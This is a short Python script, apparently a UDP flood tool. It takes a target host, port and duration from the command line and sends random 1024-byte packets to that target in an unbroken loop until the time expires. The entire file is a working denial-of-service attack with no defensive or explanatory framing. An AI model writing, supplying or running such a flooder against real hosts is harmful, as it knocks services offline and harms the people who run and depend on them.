import sys
import socket
import random
import time

host = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_data = random._urandom(1024)
timeout = time.time() + duration

while time.time() < timeout:
    sock.sendto(bytes_data, (host, port))